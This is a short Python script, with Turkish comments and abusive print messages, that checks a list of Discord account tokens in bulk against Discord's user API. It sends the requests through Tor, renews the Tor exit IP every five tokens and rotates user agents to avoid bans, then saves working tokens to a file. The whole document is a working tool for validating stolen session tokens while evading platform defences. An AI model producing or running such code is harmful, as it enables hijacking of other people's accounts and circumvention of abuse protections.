## Discord Token Checker with Tor and User Agent for Windows
import requests
import random
import time
from stem import Signal
from stem.control import Controller
import socks
import socket
import os

# Tor proxy ayarları
def renew_tor_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()  # Şifre yoksa boş bırak, varsa"password" ekle
            controller.signal(Signal.NEWNYM)
        print("Tor IP’si yenilendi, piç!")
        time.sleep(5)  # Yeni IP için bekle
    except Exception as e:
        print(f"Tor IP yenileme hatası: {e}")

# Tor proxy ile bağlantı kurma
def setup_tor_proxy():
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1", 9050)
    socket.socket = socks.socksocket
    print("Tor proxy aktif, şerefsiz!")

# Rastgele User-Agent oluşturma
def get_random_user_agent():
    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0","Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
    ]
    return random.choice(user_agents)

# Token kontrol fonksiyonu
def check_discord_token(token):
    url ="https://discord.com/api/v9/users/@me"
    headers = {"Authorization": token,"User-Agent": get_random_user_agent(),"Content-Type":"application/json"
    }
    try:
        response = requests.get(url, headers=headers, proxies={"http":"socks5://127.0.0.1:9050","https":"socks5://127.0.0.1:9050"})
        if response.status_code == 200:
            print(f"[+] Geçerli Token: {token}")
            with open("valid_tokens.txt","a") as f:
                f.write(f"{token}\n")
        else:
            print(f"[-] Geçersiz Token: {token}")
    except Exception as e:
        print(f"[!] Bağlantı Hatası: {e}")

# Ana fonksiyon
def main():
    setup_tor_proxy()
    token_file ="tokens.txt"
    if not os.path.exists(token_file):
        print("tokens.txt dosyası yok, şerefsiz! Tokenlerini ekle ve tekrar dene!")
        return

    with open(token_file,"r") as f:
        tokens = [line.strip() for line in f if line.strip()]

    for i, token in enumerate(tokens):
        if i % 5 == 0 and i!= 0:  # Her 5 tokenden sonra IP yenile
            renew_tor_ip()
        print(f"Token kontrol ediliyor: {i+1}/{len(tokens)}")
        check_discord_token(token)
        time.sleep(1)  # Ban riskini düşürmek için

if __name__ == "__main__":
    print("Windows’ta Discord Token Checker başlıyor, hazır ol motherfucker!")
    main()

## Discord Token Checker with Tor and User Agent for Windows